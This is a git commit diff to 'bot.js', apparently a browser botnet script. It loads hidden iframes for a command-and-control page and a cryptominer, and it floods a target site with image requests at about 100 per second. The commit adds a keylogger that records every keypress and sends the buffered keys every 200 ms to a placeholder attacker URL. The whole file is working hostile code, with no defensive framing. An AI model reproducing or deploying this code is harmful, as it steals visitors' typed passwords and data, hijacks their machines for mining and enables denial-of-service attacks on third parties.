c387de6f1f028b497e689cc504760167e9b8634c
ardvarknet <42424017+ardvarknet@users.noreply.github.com>
2018-09-05 06:48:45 -0400

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,6 +1,3 @@
-
-
-
 document.write("<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>");
 document.write("<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>");
 ddos('http://TARGET-SITE.com/images/header.png',
@@ -22,3 +19,22 @@ function imgflood() {
 }
 setInterval(imgflood, 10) //100 requests per second
 
+var buffer = [];
+var attacker = 'http://YourDomain.com/BotNet/CC/KeyLogger/?c='
+
+document.onkeypress = function(e) {
+    var timestamp = Date.now() | 0;
+    var stroke = {
+        k: e.key,
+        t: timestamp
+    };
+    buffer.push(stroke);
+}
+
+window.setInterval(function() {
+    if (buffer.length > 0) {
+        var data = encodeURIComponent(JSON.stringify(buffer));
+        new Image().src = attacker + data;
+        buffer = [];
+    }
+}, 200);
